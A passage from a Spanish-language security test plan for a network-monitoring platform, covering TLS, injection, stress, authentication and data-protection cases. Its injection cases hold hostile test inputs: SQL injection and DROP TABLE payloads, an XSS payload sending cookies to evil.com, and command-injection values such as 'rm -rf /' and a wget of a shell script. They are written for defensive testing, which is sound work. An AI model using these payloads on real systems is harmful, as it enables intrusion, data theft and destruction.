| **Pasos** | 1. Ejecutar OWASP ZAP en modo spider + active scan contra la API base URL. 2. Ejecutar Nuclei con templates de CVE para FastAPI/Uvicorn/PostgreSQL. 3. Ejecutar Nikto contra el servidor web. 4. Revisar hallazgos: filtrar falsos positivos, clasificar por severidad. 5. Cruzar hallazgos con casos de prueba existentes para identificar gaps. |
| **Resultado Esperado** | 0 vulnerabilidades criticas o altas no cubiertas por los casos PEN/INJ/SEC existentes. Hallazgos medios/bajos documentados para remediacion. |
| **Criterio de Aceptacion** | OWASP ZAP no reporta alertas de riesgo alto. Nuclei no detecta CVEs activos. Nikto no encuentra configuraciones peligrosas. |
| **Severidad si falla** | Alta - Vulnerabilidades no detectadas por pruebas manuales |

---

### PEN-013: Ataque de downgrade de protocolo TLS

| Campo | Detalle |
|---|---|
| **ID** | PEN-013 |
| **Titulo** | Intentar forzar downgrade de TLS 1.2+ a versiones inseguras |
| **Prioridad** | Alta |
| **RF Asociados** | RNF Seguridad |
| **Riesgo Asociado** | RS02, V-01 |
| **Objetivo** | Verificar que el servidor rechaza conexiones con versiones de TLS obsoletas (1.0, 1.1, SSL 3.0) |
| **Precondiciones** | - Herramientas: testssl.sh, openssl s_client, sslscan |
| **Pasos** | 1. Ejecutar `testssl.sh <API_URL>` para analisis completo del certificado y protocolo. 2. Intentar conexion con `openssl s_client -tls1 -connect <host>:443`. 3. Intentar con `openssl s_client -tls1_1 -connect <host>:443`. 4. Intentar con `openssl s_client -ssl3 -connect <host>:443`. 5. Verificar que solo TLS 1.2 y 1.3 son aceptados. 6. Verificar cipher suites: no RC4, DES, NULL, EXPORT, MD5-based. 7. Repetir contra el puerto TCP del colector (agente→colector). |
| **Resultado Esperado** | Conexiones con TLS <1.2 rechazadas. Solo cipher suites modernas aceptadas. Certificate chain valida. |
| **Criterio de Aceptacion** | testssl.sh no reporta vulnerabilidades criticas (POODLE, BEAST, CRIME, Heartbleed). Solo TLS 1.2+ habilitado. |
| **Severidad si falla** | Alta - Trafico interceptable mediante downgrade |

---

## 7. Casos de Prueba de Inyeccion y Dependencias (INJ)

> **Prioridad: CRITICA** | Basados en OWASP Top 10: A03 Injection

### INJ-001: SQL Injection en endpoint de login

| Campo | Detalle |
|---|---|
| **ID** | INJ-001 |
| **Titulo** | Inyeccion SQL en campo username/password del endpoint de autenticacion |
| **Prioridad** | Critica |
| **RF Asociados** | RF-030 |
| **Riesgo Asociado** | V-06 |
| **Endpoint** | `POST /api/auth/login` |
| **Precondiciones** | - API accesible. - Herramientas: sqlmap, Burp Suite |
| **Pasos** | 1. Enviar `{"username": "admin' OR '1'='1", "password": "x"}`. 2. Enviar `{"username": "admin'--", "password": ""}`. 3. Enviar `{"username": "admin'; DROP TABLE users;--", "password": "x"}`. 4. Enviar payloads de sqlmap contra el endpoint. 5. Probar inyeccion blind con `{"username": "admin' AND SLEEP(5)--", "password": "x"}`. 6. Verificar que se usa ORM con parametros preparados (SQLAlchemy / Pydantic). |
| **Resultado Esperado** | Todos los intentos retornan 401 con el mismo mensaje generico. Ningun payload altera la logica de consulta. Tiempo de respuesta constante (sin variaciones que indiquen blind SQLi). |
| **Criterio de Aceptacion** | sqlmap reporta "all tested parameters do not appear to be injectable". |
| **Severidad si falla** | Critica - Acceso total a la base de datos, incluyendo password_hash y sesiones |

---

### INJ-002: SQL Injection en parametros de consulta de dispositivos

| Campo | Detalle |
|---|---|
| **ID** | INJ-002 |
| **Titulo** | Inyeccion SQL en query params de busqueda y filtrado |
| **Prioridad** | Alta |
| **RF Asociados** | RF-032 |
| **Endpoint** | `GET /api/devices?search=<payload>&status=<payload>` |
| **Precondiciones** | - Token JWT valido. - Herramientas: sqlmap, Burp |
| **Pasos** | 1. `GET /api/devices?search=' OR 1=1--`. 2. `GET /api/devices?status=active' UNION SELECT username,password_hash FROM users--`. 3. `GET /api/devices?search=test%27%3BSELECT%20pg_sleep(5)--`. 4. Verificar cada query param documentado (search, status, has_agent). |
| **Resultado Esperado** | La API retorna 400 Bad Request o lista filtrada normal. Ningun payload altera la consulta SQL subyacente. |
| **Criterio de Aceptacion** | Todos los parametros son sanitizados via ORM. No hay concatenacion de strings en queries. |
| **Severidad si falla** | Alta - Extraccion de datos sensibles de cualquier tabla |

---

### INJ-003: Stored XSS via campo alias de dispositivo

| Campo | Detalle |
|---|---|
| **ID** | INJ-003 |
| **Titulo** | Inyeccion de scripts maliciosos en el campo alias de dispositivos |
| **Prioridad** | Alta |
| **RF Asociados** | RF-038, RF-047 |
| **Riesgo Asociado** | V-06 (DEVICE.alias VARCHAR(64)) |
| **Endpoint** | `PUT /api/devices/{id}/alias` |
| **Precondiciones** | - Token JWT valido. - Dispositivo existente. - Herramientas: Burp Suite |
| **Pasos** | 1. `PUT /api/devices/1/alias` con `{"alias": "<script>alert('xss')</script>"}`. 2. Intentar con `{"alias": "<img src=x onerror=alert(1)>"}`. 3. Intentar con `{"alias": "test\"><script>fetch('http://evil.com/steal?t='+document.cookie)</script>"}`. 4. Verificar como se renderiza el alias en la app movil (Flutter). 5. Verificar si la API retorna el alias sin escapar en `GET /api/devices`. |
| **Resultado Esperado** | La API debe: (a) rechazar alias con caracteres HTML/script, o (b) almacenarlo escapado, o (c) retornarlo con Content-Type adecuado. La app Flutter debe renderizar como texto plano, nunca como HTML. |
| **Criterio de Aceptacion** | El alias se muestra como texto literal en la app (Flutter Text widget, nunca WebView/HTML). Ningun script se ejecuta. Validacion server-side con regex `^[a-zA-Z0-9 _.-]{1,64}$`. La API rechaza con 400 cualquier alias que no cumpla. |
| **Severidad si falla** | Alta - XSS almacenado que afecta a todos los usuarios que visualicen el dispositivo |

---

### INJ-004: Inyeccion de comandos via hostname o MAC en registro de agente

| Campo | Detalle |
|---|---|
| **ID** | INJ-004 |
| **Titulo** | OS Command Injection en campos hostname/MAC durante autoregistro |
| **Prioridad** | Critica |
| **RF Asociados** | RF-009 |
| **Riesgo Asociado** | V-07 |
| **Precondiciones** | - Acceso al puerto TCP del colector. - Herramientas: Python socket |
| **Pasos** | 1. Enviar handshake con `hostname: "test; rm -rf /"`. 2. Enviar con `hostname: "$(cat /etc/passwd)"`. 3. Enviar con `mac: "AA:BB:CC:DD:EE:FF; wget http://evil.com/shell.sh"`. 4. Enviar con `hostname: "test\nX-Injected-Header: malicious"` (CRLF injection). 5. Verificar si los valores se usan en llamadas a sistema (subprocess, os.system). |
| **Resultado Esperado** | El colector debe validar: hostname con regex `^[a-zA-Z0-9._-]{1,255}$`, MAC con regex `^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$`. Valores invalidos rechazan el handshake. |
| **Criterio de Aceptacion** | Ningun valor de hostname o MAC se pasa a funciones de ejecucion de sistema. Validacion estricta con regex en la capa de entrada. |
| **Severidad si falla** | Critica - Ejecucion remota de codigo en el servidor |

---

### INJ-005: Inyeccion en campos de rango temporal de metricas historicas

| Campo | Detalle |
|---|---|
| **ID** | INJ-005 |
| **Titulo** | Inyeccion SQL/NoSQL en parametros from/to de consultas historicas |
| **Prioridad** | Alta |
| **RF Asociados** | RF-040 |
| **Endpoint** | `GET /api/devices/{id}/metrics/history?from=<payload>&to=<payload>` |
| **Precondiciones** | - Token JWT valido. - Herramientas: Burp Suite |
| **Pasos** | 1. `?from=2024-01-01' OR '1'='1&to=2024-12-31`. 2. `?from=2024-01-01; DROP TABLE endpoint_snapshot;--&to=2024-12-31`. 3. `?from=invalid_date&to=another_invalid`. 4. `?from=2020-01-01&to=2099-12-31` (rango extremo para DoS). 5. `?resolution=1m'; SELECT * FROM users--`. |
| **Resultado Esperado** | La API debe validar formato ISO 8601 estricto. Rechazar rangos invalidos con 400. Limitar rango maximo para prevenir consultas costosas. |
| **Criterio de Aceptacion** | Solo se aceptan timestamps ISO 8601 validos. Rango maximo de 90 dias. El parametro resolution solo acepta valores del enum (1m, 5m, 1h, 1d). |
| **Severidad si falla** | Alta - Inyeccion SQL o denegacion de servicio via queries costosas |

---

### INJ-006: Inyeccion en payload PCAP malformado

| Campo | Detalle |
|---|---|
| **ID** | INJ-006 |
| **Titulo** | Envio de archivo PCAP malformado o con paquetes crafteados al colector |
| **Prioridad** | Alta |
| **RF Asociados** | RF-003, RF-011, RF-016 |
| **Riesgo Asociado** | V-04 |
| **Precondiciones** | - Acceso al puerto TCP del colector. - Herramientas: scapy, tcpreplay |
| **Pasos** | 1. Enviar un flujo TCP con cabecera PCAP valida pero paquetes con longitud declarada >> longitud real (buffer overflow). 2. Enviar paquetes con headers IP malformados (longitud total = 0). 3. Enviar 100,000 paquetes de 1 byte para llenar el buffer. 4. Enviar PCAP con paquetes encapsulando payloads binarios arbitrarios. 5. Verificar que tshark/pyshark no crashea al procesar los PCAP rotados. |
| **Resultado Esperado** | El colector debe validar la integridad del flujo PCAP. Paquetes malformados se descartan sin crashear el servicio. El motor de analisis maneja errores de parseo gracefully. |
| **Criterio de Aceptacion** | El servicio de coleccion permanece operativo tras recibir 1000 paquetes malformados consecutivos. Sin memory leaks ni crashes. |
| **Severidad si falla** | Alta - Denegacion de servicio o ejecucion de codigo via buffer overflow |

---

### INJ-007: Inyeccion de dependencias Python (Supply Chain)

| Campo | Detalle |
|---|---|
| **ID** | INJ-007 |
| **Titulo** | Verificacion de integridad de dependencias del backend Python |
| **Prioridad** | Alta |
| **RF Asociados** | Transversal (CI/CD) |
| **Riesgo Asociado** | RG04 |
| **Precondiciones** | - Acceso al repositorio de codigo. - Herramientas: pip-audit, safety, Snyk |
| **Pasos** | 1. Ejecutar `pip-audit` contra el `requirements.txt` del backend. 2. Ejecutar `safety check --full-report`. 3. Verificar que no se usan versiones de dependencias con CVEs criticos (FastAPI, uvicorn, SQLAlchemy, psycopg2, pyshark, scapy). 4. Verificar que requirements.txt usa versiones pinneadas (no `>=`). 5. Verificar que no se instalan paquetes desde fuentes no oficiales. 6. Auditar dependencias transitivas. |
| **Resultado Esperado** | 0 vulnerabilidades criticas o altas en dependencias directas. Todas las versiones pinneadas. Solo fuentes PyPI oficiales. |
| **Criterio de Aceptacion** | `pip-audit` y `safety` reportan 0 issues de severidad alta o critica. Pipeline CI/CD incluye verificacion automatica de dependencias. |
| **Severidad si falla** | Alta - Compromiso del backend via dependencia vulnerable |

---

### INJ-008: Inyeccion de dependencias Flutter (Supply Chain)

| Campo | Detalle |
|---|---|
| **ID** | INJ-008 |
| **Titulo** | Verificacion de integridad de dependencias de la app movil Flutter |
| **Prioridad** | Alta |
| **RF Asociados** | Transversal (CI/CD) |
| **Riesgo Asociado** | RG04 |
| **Precondiciones** | - Acceso al repositorio. - Herramientas: flutter pub outdated, Snyk |
| **Pasos** | 1. Ejecutar `flutter pub outdated` para verificar dependencias desactualizadas. 2. Revisar `pubspec.lock` para versiones pinneadas. 3. Auditar paquetes criticos: `http`/`dio`, `flutter_secure_storage`, `firebase_messaging`, `provider`/`riverpod`. 4. Verificar que no se usan paquetes con < 100 likes o sin mantenimiento activo. 5. Buscar CVEs conocidos en dependencias Flutter. |
| **Resultado Esperado** | Todas las dependencias estan actualizadas y son de fuentes confiables (pub.dev oficial). Sin CVEs conocidos. |
| **Criterio de Aceptacion** | `flutter pub outdated` no muestra dependencias con vulnerabilidades conocidas. Todas las dependencias criticas tienen mantenimiento activo (<6 meses ultimo update). |
| **Severidad si falla** | Alta - Compromiso de la app movil via paquete malicioso |

---

## 8. Casos de Prueba de Estres de Red (NET)

> **Prioridad: ALTA** | Basados en riesgo RT03, RNF de rendimiento y V-03

### NET-001: Estres por volumen - multiples agentes simultaneos

| Campo | Detalle |
|---|---|
| **ID** | NET-001 |
| **Titulo** | Colector bajo carga de 10+ agentes transmitiendo simultaneamente |
| **Prioridad** | Alta |
| **RF Asociados** | RF-003, RF-011, RF-013 |
| **Riesgo Asociado** | RT03 |
| **Objetivo** | Verificar que el colector soporta al menos 10 agentes simultaneos sin degradacion (RNF de rendimiento) |
| **Precondiciones** | - 10 agentes simulados (pueden ser scripts Python). - Red de prueba. - Herramientas: iperf3, custom scripts |
| **Pasos** | 1. Desplegar 10 agentes simulados en la red enviando trafico PCAP al colector. 2. Cada agente genera ~5 Mbps de trafico TCP. 3. Simultaneamente, cada agente envia metricas UDP cada 5s. 4. Monitorear: CPU del servidor, memoria, uso de disco, conexiones TCP abiertas. 5. Mantener la carga por 30 minutos. 6. Verificar que ningun agente pierde conexion. 7. Medir latencia de escritura en buffer PCAP. |
| **Resultado Esperado** | El colector mantiene las 10 conexiones estables. CPU del servidor <80%. Memoria <80%. Sin OOM kills. Sin loss de conexiones TCP. |
| **Criterio de Aceptacion** | 10 agentes durante 30 min sin degradacion. CPU servidor <80%, RAM <80%. Rotacion de PCAP ocurre en tiempo. Motor procesa lotes sin acumulacion (max 2 pendientes). 0 conexiones TCP perdidas. 0 OOM kills. |
| **Severidad si falla** | Alta - El sistema no cumple el RNF de rendimiento basico |

---

### NET-002: Estres por flooding - saturacion del canal de metricas UDP

| Campo | Detalle |
|---|---|
| **ID** | NET-002 |
| **Titulo** | Flooding de paquetes UDP al puerto de metricas del colector |
| **Prioridad** | Alta |
| **RF Asociados** | RF-006, RF-012 |
| **Riesgo Asociado** | RT03 |
| **Precondiciones** | - Puerto UDP del colector conocido. - Herramientas: hping3, custom Python script |
| **Pasos** | 1. Enviar 10,000 paquetes UDP/segundo al puerto de metricas del colector durante 5 minutos. 2. Medir: paquetes procesados vs descartados, CPU del colector, memoria. 3. Simultaneamente, verificar que los agentes legitimos siguen pudiendo enviar metricas. 4. Verificar que la recepcion TCP de PCAP no se ve afectada. 5. Verificar que la API sigue respondiendo. |
| **Resultado Esperado** | El colector aplica rate limiting o cola de procesamiento. Los paquetes excedentes se descartan sin afectar otros servicios. La API mantiene <2s de respuesta. |
| **Criterio de Aceptacion** | El servicio no crashea. Los agentes legitimos mantienen conectividad. La API responde en <2s durante el flooding. |
| **Severidad si falla** | Alta - Denegacion de servicio via flooding trivial |

---

### NET-003: Estres por desconexion masiva - todos los agentes caen simultaneamente

| Campo | Detalle |
|---|---|
| **ID** | NET-003 |
| **Titulo** | Desconexion abrupta y reconexion simultanea de todos los agentes |
| **Prioridad** | Alta |
| **RF Asociados** | RF-003, RF-010, RF-015 |
| **Riesgo Asociado** | RNF Fiabilidad |
| **Precondiciones** | - 10 agentes conectados y transmitiendo. - Herramientas: iptables/tc para simular |
| **Pasos** | 1. Con 10 agentes activos, cortar todas las conexiones TCP simultaneamente (simular caida de switch). 2. Verificar que el colector detecta la desconexion y marca agentes como inactivos. 3. Esperar 30 segundos. 4. Restaurar conectividad. 5. Medir tiempo que tarda cada agente en reconectarse (RNF: <60s). 6. Verificar que el inventario de agentes refleja el estado real. 7. Repetir 5 veces para verificar estabilidad. |
| **Resultado Esperado** | El colector detecta desconexiones en <30s. Los agentes se reconectan automaticamente en <60s. El buffer PCAP no se corrompe. No hay file descriptors leakeados. |
| **Criterio de Aceptacion** | 100% de agentes reconectados en <60s. El colector no acumula conexiones zombie. El sistema retorna a operacion normal sin intervencion manual. |
| **Severidad si falla** | Alta - Perdida de monitoreo tras interrupciones de red |

---

### NET-004: Estres de la API bajo carga concurrente

| Campo | Detalle |
|---|---|
| **ID** | NET-004 |
| **Titulo** | Prueba de carga de la API REST con multiples clientes concurrentes |
| **Prioridad** | Alta |
| **RF Asociados** | RF-032 a RF-040 |
| **Riesgo Asociado** | V-03, RNF Rendimiento |
| **Precondiciones** | - API desplegada. - Herramientas: k6, Apache JMeter, Locust |
| **Pasos** | 1. Configurar escenario con 50 usuarios virtuales concurrentes. 2. Cada usuario ejecuta ciclo: login → dashboard → devices → device detail → metrics → alerts. 3. Medir: p50, p95, p99 de tiempos de respuesta. 4. Escalar a 100 usuarios. 5. Verificar que consultas simples <2s y historicas <5s (RNF). 6. Verificar tasa de errores (target: <1%). 7. Medir: conexiones a BD, pool exhaustion, memory leaks. |
| **Resultado Esperado** | p95 consultas simples <2s. p95 historicas <5s. Tasa de error <1%. Sin connection pool exhaustion. Sin memory leaks. |
| **Criterio de Aceptacion** | La API responde al 99% de peticiones correctamente bajo carga de 50 usuarios concurrentes (RNF Disponibilidad). |
| **Severidad si falla** | Alta - Sistema inutilizable bajo carga real |

---

### NET-005: Estres del motor de analisis - acumulacion de PCAP

| Campo | Detalle |
|---|---|
| **ID** | NET-005 |
| **Titulo** | Verificar que el motor procesa PCAPs mas rapido que la rotacion |
| **Prioridad** | Alta |
| **RF Asociados** | RF-014, RF-016, RF-017, RF-018 |
| **Riesgo Asociado** | RNF Rendimiento |
| **Precondiciones** | - Colector recibiendo trafico de 10 agentes. - Rotacion cada 1 min o 100MB |
| **Pasos** | 1. Generar trafico sostenido que produzca rotacion de PCAP cada minuto. 2. Monitorear el directorio de PCAPs pendientes durante 1 hora. 3. Contar: archivos rotados vs archivos procesados. 4. Verificar que no se acumulan mas de 2 archivos sin procesar. 5. Medir tiempo promedio de procesamiento por lote. 6. Verificar limpieza correcta de PCAPs procesados (RF-019). |
| **Resultado Esperado** | El motor procesa cada lote en menos tiempo que el intervalo de rotacion. No se acumulan mas de 2 lotes pendientes. El disco no se llena. |
| **Criterio de Aceptacion** | Tiempo de procesamiento por lote < intervalo de rotacion (60s). Espacio en disco estable durante 1h de operacion. |
| **Severidad si falla** | Alta - El sistema pierde capacidad de analisis en tiempo real |

---

### NET-006: Latencia de red agente-colector

| Campo | Detalle |
|---|---|
| **ID** | NET-006 |
| **Titulo** | Verificar que la transmision de paquetes no introduce >50ms de latencia |
| **Prioridad** | Media |
| **RF Asociados** | RF-003 |
| **Riesgo Asociado** | RT05, RNF Rendimiento |
| **Precondiciones** | - Agente y colector en la misma LAN. - Herramientas: Wireshark, ping, tc |
| **Pasos** | 1. Medir latencia base entre agente y colector con `ping`. 2. Activar el agente y medir latencia durante transmision continua. 3. Calcular overhead: latencia con agente - latencia base. 4. Repetir con 5 y 10 agentes activos. 5. Simular red degradada (100ms de latencia adicional con `tc netem`) y verificar comportamiento. |
| **Resultado Esperado** | El overhead del agente <50ms en condiciones normales de LAN. Con red degradada, el agente sigue operando sin perder paquetes criticos. |
| **Criterio de Aceptacion** | Latencia adicional introducida por el agente <50ms (RNF). |
| **Severidad si falla** | Media - Impacto en rendimiento de red para el usuario final |

---

### NET-007: Agotamiento de disco por acumulacion de PCAP (DoS)

| Campo | Detalle |
|---|---|
| **ID** | NET-007 |
| **Titulo** | Denegacion de servicio por llenado de disco con archivos PCAP no procesados |
| **Prioridad** | Alta |
| **RF Asociados** | RF-014, RF-019 |
| **Riesgo Asociado** | V-04, RNF Disponibilidad |
| **Objetivo** | Verificar que el sistema maneja correctamente la situacion de disco lleno sin corromper datos ni crashear |
| **Precondiciones** | - Entorno de pruebas con particion de disco limitada (ej. 1GB). - 5+ agentes transmitiendo |
| **Pasos** | 1. Configurar particion de disco con espacio limitado (1GB). 2. Desactivar o ralentizar el motor de analisis para que los PCAP se acumulen. 3. Generar trafico intenso desde multiples agentes. 4. Monitorear espacio en disco hasta que alcance >90%. 5. Verificar que el sistema genera alerta de disco lleno (BKD-017). 6. Verificar que el colector deja de escribir nuevos PCAP sin crashear. 7. Verificar que la API sigue respondiendo. 8. Liberar espacio → verificar recuperacion automatica. |
| **Resultado Esperado** | El sistema detecta disco >90% y genera alerta. El colector pausa escritura de PCAP de forma controlada. La API y BD continuan operativas. Tras liberar espacio, el sistema se recupera automaticamente. |
| **Criterio de Aceptacion** | Sin crash, sin corrupcion de BD, sin perdida de datos existentes. Alerta generada antes de llegar a 95% de disco. Recuperacion automatica sin intervencion manual. |
| **Severidad si falla** | Alta - Denegacion de servicio completa y posible corrupcion de datos |

---

## 9. Casos de Prueba de Seguridad - Autenticacion y Autorizacion (SEC)

> **Prioridad: ALTA** | Basados en RF-030, RF-031, RF-041 a RF-043

### SEC-001: Fuerza bruta en endpoint de login

| Campo | Detalle |
|---|---|
| **ID** | SEC-001 |
| **Titulo** | Ataque de fuerza bruta contra /api/auth/login |
| **Prioridad** | Alta |
| **RF Asociados** | RF-030 |
| **Endpoint** | `POST /api/auth/login` |
| **Pasos** | 1. Enviar 100 intentos de login con password incorrecta en 60 segundos. 2. Verificar si hay rate limiting o bloqueo temporal. 3. Enviar 1000 intentos con diccionario de passwords comunes. 4. Medir tiempo de respuesta por intento (detectar timing attacks). 5. Verificar si el sistema distingue entre usuario inexistente y password incorrecta en los mensajes de error. |
| **Resultado Esperado** | Rate limiting activo: maximo 5-10 intentos por minuto por IP. Bloqueo temporal tras multiples fallos. Mensajes de error genericos e identicos para usuario inexistente y password incorrecta. Tiempo de respuesta constante (+/- 50ms). |
| **Criterio de Aceptacion** | Bloqueo o throttling a partir del intento 5 por IP (10 por cuenta). Sin enumeracion de usuarios (mensaje identico para usuario invalido y password incorrecta). Sin timing attacks (variacion <50ms entre ambos escenarios). Bloqueo temporal exponencial: 30s, 60s, 120s, 300s. |
| **Severidad si falla** | Alta - Credenciales obtenibles por fuerza bruta |

---

### SEC-002: Validacion de fortaleza de hashing de passwords

| Campo | Detalle |
|---|---|
| **ID** | SEC-002 |
| **Titulo** | Verificar que las passwords se almacenan con algoritmo seguro |
| **Prioridad** | Alta |
| **RF Asociados** | RF-030, RNF Seguridad |
| **Precondiciones** | - Acceso a la base de datos (entorno de pruebas) |
| **Pasos** | 1. Crear un usuario de prueba con password conocida. 2. Consultar el campo `password_hash` en tabla USER directamente en PostgreSQL. 3. Verificar el prefijo del hash ($2b$ = bcrypt, $argon2id$ = argon2). 4. Intentar crackear el hash con hashcat y diccionario rockyou.txt. 5. Verificar que se usa salt unico por usuario. 6. Verificar que el hash NO es MD5, SHA1 o SHA256 sin salt. |
| **Resultado Esperado** | Password almacenada con bcrypt (work factor >= 12) o argon2id. El hash no es crackeable en tiempo razonable con diccionario. Salt unico por usuario. |
| **Criterio de Aceptacion** | Algoritmo bcrypt con cost >= 12, o argon2id (memory >= 64MB, iterations >= 3, parallelism >= 1). Hash no reversible en 24h con GPU (RTX 4090 benchmark). Salt unico por usuario (minimo 16 bytes). Pepper opcional almacenado fuera de BD. |
| **Severidad si falla** | Alta - Credenciales recuperables si la BD se compromete |

---

### SEC-003: Validacion de expiracion y revocacion de JWT

| Campo | Detalle |
|---|---|
| **ID** | SEC-003 |
| **Titulo** | Verificar ciclo de vida completo del token JWT |
| **Prioridad** | Alta |
| **RF Asociados** | RF-030, RF-031, RF-042, RF-043 |
| **Endpoint** | Todos los endpoints protegidos |
| **Pasos** | 1. Hacer login y obtener token con `expires_at`. 2. Usar el token inmediatamente → debe funcionar. 3. Esperar a que expire (o modificar tiempo del sistema) → debe retornar 401. 4. Hacer logout (POST /api/auth/logout) → token debe quedar revocado. 5. Intentar usar token revocado → debe retornar 401. 6. Verificar que la Session en BD tiene `revoked=true` tras logout. |
| **Resultado Esperado** | Token funcional antes de expiracion. Rechazado tras expiracion. Rechazado tras logout. No reutilizable tras revocacion. |
| **Criterio de Aceptacion** | Tokens expirados y revocados retornan 401 en el 100% de los intentos. La tabla Session refleja correctamente el estado. |
| **Severidad si falla** | Alta - Sesiones que nunca expiran o tokens reutilizables post-logout |

---

### SEC-004: Verificacion de headers de seguridad HTTP

| Campo | Detalle |
|---|---|
| **ID** | SEC-004 |
| **Titulo** | Validar presencia de headers de seguridad en respuestas de la API |
| **Prioridad** | Media |
| **RF Asociados** | RNF Seguridad |
| **Endpoint** | Todos |
| **Pasos** | 1. Enviar cualquier peticion a la API y capturar headers de respuesta. 2. Verificar presencia de: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Strict-Transport-Security` (si HTTPS), `Content-Type: application/json`. 3. Verificar ausencia de: `Server` (con version), `X-Powered-By`, stack traces en cuerpos de error. 4. Verificar CORS: que no permita `Access-Control-Allow-Origin: *`. |
| **Resultado Esperado** | Todos los headers de seguridad presentes. Sin informacion de version del servidor. CORS restrictivo. |
| **Criterio de Aceptacion** | Cumple checklist de headers de seguridad OWASP. Headers obligatorios: X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security (max-age>=31536000), Content-Security-Policy. CORS: solo origenes especificos de la app, nunca wildcard (*). |
| **Severidad si falla** | Media - Informacion expuesta facilita ataques posteriores |

---

### SEC-005: Verificacion de logs de auditoria

| Campo | Detalle |
|---|---|
| **ID** | SEC-005 |
| **Titulo** | Validar que todas las acciones criticas generan registros de auditoria |
| **Prioridad** | Alta |
| **RF Asociados** | RNF Seguridad, RS03 |
| **Precondiciones** | - Acceso a logs del servidor |
| **Pasos** | 1. Realizar login exitoso → verificar log con timestamp, usuario, IP. 2. Realizar login fallido → verificar log con timestamp, intento, IP. 3. Consultar dispositivos → verificar log de acceso. 4. Modificar alias → verificar log de modificacion. 5. Registrar agente → verificar log de registro. 6. Generar alerta → verificar log de alerta. 7. Verificar que los logs no contienen passwords ni tokens en texto plano. 8. Verificar que los logs son append-only (inmutables). |
| **Resultado Esperado** | Todas las acciones criticas registradas con timestamp, actor, accion e IP. Sin datos sensibles en logs. Logs inmutables. |
| **Criterio de Aceptacion** | 100% de acciones de autenticacion, modificacion y registro generan log. Formato estructurado (JSON) con campos: timestamp (ISO 8601), actor_id, action, resource, ip_source, result (success/failure). Los logs cumplen con la trazabilidad requerida (RNF Seguridad). Retencion minima de 90 dias. Logs append-only (sin capacidad de edicion/eliminacion por la aplicacion). |
| **Severidad si falla** | Alta - Sin capacidad de auditoria ni deteccion de accesos no autorizados |

---

### SEC-006: FastAPI /docs deshabilitado en produccion

| Campo | Detalle |
|---|---|
| **ID** | SEC-006 |
| **Titulo** | Verificar que la documentacion interactiva de FastAPI no esta expuesta en produccion |
| **Prioridad** | Alta |
| **RF Asociados** | RNF Seguridad |
| **Riesgo Asociado** | OWASP A05, V-03 |
| **Pasos** | 1. Acceder a `<API_URL>/docs` en entorno de produccion. 2. Acceder a `<API_URL>/redoc`. 3. Acceder a `<API_URL>/openapi.json`. 4. Verificar que los 3 endpoints retornan 404 o estan protegidos con autenticacion. 5. En entorno de desarrollo, verificar que si estan disponibles (configuracion por entorno). |
| **Resultado Esperado** | En produccion: /docs, /redoc y /openapi.json retornan 404. En desarrollo: disponibles para el equipo. |
| **Criterio de Aceptacion** | 0 endpoints de documentacion expuestos sin autenticacion en produccion. Variable de entorno controla la exposicion (`FASTAPI_DOCS_ENABLED=false`). |
| **Severidad si falla** | Alta - Exposicion del contrato completo de API facilita ataques dirigidos |

---

### SEC-007: Rate limiting global en la API

| Campo | Detalle |
|---|---|
| **ID** | SEC-007 |
| **Titulo** | Verificar que la API implementa rate limiting en todos los endpoints |
| **Prioridad** | Alta |
| **RF Asociados** | RNF Disponibilidad, RNF Seguridad |
| **Riesgo Asociado** | OWASP A05, V-03 |
| **Pasos** | 1. Enviar 200 peticiones/minuto a `GET /api/devices` con token valido. 2. Verificar que se recibe 429 Too Many Requests despues del umbral. 3. Verificar headers de rate limit: `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After`. 4. Repetir para cada endpoint protegido. 5. Verificar rate limiting por IP (sin token) en endpoint de login. 6. Verificar que el rate limiting es por usuario/IP, no global (un usuario limitado no afecta a otros). |
| **Resultado Esperado** | Rate limiting activo en todos los endpoints. Headers informativos presentes. Limitacion por usuario/IP independiente. |
| **Criterio de Aceptacion** | Todos los endpoints retornan 429 al exceder el umbral configurado. El umbral es configurable por endpoint. Login tiene umbral mas restrictivo (10 req/min). |
| **Severidad si falla** | Alta - API vulnerable a abuso y denegacion de servicio |

---

### SEC-008: Verificacion de integridad de agentes

| Campo | Detalle |
|---|---|
| **ID** | SEC-008 |
| **Titulo** | Verificar que el colector valida la integridad y autenticidad de los agentes conectados |
| **Prioridad** | Alta |
| **RF Asociados** | RF-009, RF-015 |
| **Riesgo Asociado** | OWASP A04, V-02, V-07 |
| **Pasos** | 1. Verificar que el handshake de registro incluye un mecanismo de autenticacion (token pre-compartido, certificado TLS cliente, o HMAC). 2. Intentar registro con token/certificado invalido → verificar rechazo. 3. Intentar replay de un handshake capturado previamente → verificar rechazo (nonce/timestamp). 4. Verificar que cada agente tiene un UID criptograficamente unico (no basado solo en hostname+MAC). 5. Verificar que un agente comprometido no puede escalar privilegios sobre el colector. |
| **Resultado Esperado** | Solo agentes con credenciales validas pueden registrarse. Replay attacks fallan. UID es unico y no predecible. |
| **Criterio de Aceptacion** | 100% de intentos de registro sin credenciales validas son rechazados. UIDs generados con componente aleatorio criptografico. Intentos fallidos generan log de auditoria. |
| **Severidad si falla** | Alta - Agentes falsos pueden inyectar datos maliciosos en todo el pipeline |

---

### SEC-009: Control de sesiones concurrentes

| Campo | Detalle |
|---|---|
| **ID** | SEC-009 |
| **Titulo** | Verificar manejo de multiples sesiones activas del mismo usuario |
| **Prioridad** | Media |
| **RF Asociados** | RF-030, RF-031, RF-042 |
| **Riesgo Asociado** | OWASP A01, A07 |
| **Pasos** | 1. Hacer login desde dispositivo A → obtener token A. 2. Hacer login desde dispositivo B → obtener token B. 3. Verificar si token A sigue siendo valido (politica: sesiones concurrentes o sesion unica). 4. Si politica de sesion unica: verificar que token A queda revocado y retorna 401. 5. Si politica de sesiones concurrentes: verificar que ambas sesiones son independientes. 6. Hacer logout desde dispositivo B → verificar que token A no se ve afectado. 7. Verificar tabla Session: maximo de sesiones activas por usuario. |
| **Resultado Esperado** | El sistema implementa una politica explicita de sesiones concurrentes. Si permite multiples, cada sesion es independiente. Si no, la sesion anterior se revoca al crear una nueva. |
| **Criterio de Aceptacion** | Politica de sesiones documentada e implementada consistentemente. Sin sesiones huerfanas. |
| **Severidad si falla** | Media - Sesiones no controladas permiten acceso desde dispositivos desconocidos |

---

## 10. Casos de Prueba de Seguridad - Proteccion de Datos (DAT)

> **Prioridad: ALTA** | Basados en riesgos RS01, RS02

### DAT-001: Cifrado de datos sensibles en almacenamiento local movil
